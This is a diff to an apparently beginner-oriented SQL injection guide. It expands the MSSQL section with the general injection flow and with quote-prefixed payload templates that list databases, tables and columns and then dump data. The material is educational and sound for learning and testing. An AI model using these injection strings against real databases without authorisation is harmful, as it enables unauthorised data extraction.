@@ -95,7 +95,7 @@ A couple extra things to keep in mind. `--` comments out the rest of the line. `
 
 ### Other SQL Distros
 
-Most of the SQLIs you will come across as a beginner will be MySQL. But, in some cases, it will be other distributions. For the most part, the syntax is the same depending on the distro. I won't go into every cmd on every distro but will just give an example to extrapolate from.
+Most of the SQLIs you will come across as a beginner will be MySQL. But, in some cases, it will be other distributions. For the most part, the syntax is the same depending on the distro. I won't go into every cmd on every distro as the general flow of the injection is extremely similar, enumerate DBs, Tables, Columns, and then Dump data, but I will just give an example to extrapolate from.
 
 
 #### MSSQL
@@ -110,11 +110,13 @@ Most of the SQLIs you will come across as a beginner will be MySQL. But, in some
 ' SELECT name FROM master..sysdatabases
 
 # Get tables
-SELECT name FROM <table>..sysobjects WHERE xtype = 'U'
+' SELECT name FROM <db>..sysobjects WHERE xtype = 'U'
 
 # Get columns
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '<table>')
 
 # Dump data
+' SELECT  <column1>, <column2> from <table>
 ```
 
 #### PostgreSQL
